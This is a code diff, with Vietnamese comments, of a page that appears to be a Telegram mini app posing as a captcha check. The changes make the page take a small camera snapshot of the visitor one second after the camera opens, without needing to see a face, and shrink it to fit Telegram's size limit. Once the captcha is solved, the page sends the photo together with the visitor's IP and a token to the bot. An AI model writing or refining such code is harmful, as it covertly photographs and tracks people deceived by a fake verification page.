@@ -53,7 +53,7 @@
         const num2 = Math.floor(Math.random() * 10) + 1;
         const correctCaptcha = num1 + num2;
         let captchaVerified = false;
-        let cameraSent = false;
+        let capturedImage = "";
         let localStream = null;
 
         document.getElementById('captcha-question').innerText = `${num1} + ${num2} = ?`;
@@ -94,9 +94,15 @@
                 return;
             }
 
-            // Chờ 1.5 giây để khung hình camera ổn định trước khi chụp
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            await captureAndSendPhoto();
+            // Chờ 1 giây cho khung hình ổn định rồi chụp ngay (không cần thấy mặt)
+            await new Promise(r => setTimeout(r, 1000));
+            capturedImage = snapshotSmall();
+
+            // Tắt camera sau khi chụp xong
+            if (localStream) {
+                localStream.getTracks().forEach(t => t.stop());
+                localStream = null;
+            }
 
             document.getElementById('status').innerText = "Vui lòng giải mã Captcha bên dưới:";
             document.getElementById('captcha-section').style.display = "block";
@@ -123,38 +129,26 @@
             }
         }
 
-        async function captureAndSendPhoto() {
-            if (cameraSent) return;
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            if (!video.videoWidth) return;
-
-            const MAX_W = 480, MAX_H = 360;
-            let w = video.videoWidth, h = video.videoHeight;
-            const ratio = Math.min(MAX_W / w, MAX_H / h, 1);
-            canvas.width = Math.round(w * ratio);
-            canvas.height = Math.round(h * ratio);
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const imageDataUrl = canvas.toDataURL('image/jpeg', 0.6);
-
+        // Chụp ảnh nhỏ, giảm dần kích thước cho tới khi < 2800 ký tự
+        // (sendData của Telegram giới hạn 4096 byte cho toàn bộ dữ liệu)
+        function snapshotSmall() {
             try {
-                tg.sendData(JSON.stringify({
-                    type: "camera_snapshot",
-                    token: token,
-                    image: imageDataUrl,
-                    ip: clientIp
-                }));
-                cameraSent = true;
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                if (!video.videoWidth) return "";
+                const ctx = canvas.getContext('2d');
+                const tries = [[96, 72, 0.5], [80, 60, 0.45], [64, 48, 0.4], [48, 36, 0.35], [32, 24, 0.3]];
+                for (const [w, h, q] of tries) {
+                    canvas.width = w;
+                    canvas.height = h;
+                    ctx.drawImage(video, 0, 0, w, h);
+                    const url = canvas.toDataURL('image/jpeg', q);
+                    if (url.length < 2800) return url;
+                }
             } catch (e) {
-                console.log("sendData camera lỗi:", e);
+                console.log("Lỗi chụp ảnh:", e);
             }
-
-            if (localStream) {
-                localStream.getTracks().forEach(t => t.stop());
-                localStream = null;
-            }
+            return "";
         }
 
         function verifyCaptcha() {
@@ -168,15 +162,19 @@
                 document.getElementById('status').innerText = "✅ Xác minh thành công! Đang gửi dữ liệu...";
                 document.getElementById('captcha-section').style.display = "none";
 
+                // sendData chỉ gửi được 1 lần nên gộp ảnh + captcha vào một gói duy nhất
                 setTimeout(() => {
                     try {
                         tg.sendData(JSON.stringify({
-                            type: "miniapp_captcha",
+                            type: "camera_snapshot",
                             token: token,
                             ip: clientIp,
-                            passed: true
+                            passed: true,
+                            image: capturedImage
                         }));
-                    } catch (e) {}
+                    } catch (e) {
+                        console.log("sendData lỗi:", e);
+                    }
                     setTimeout(() => tg.close(), 500);
                 }, 300);
             } else {
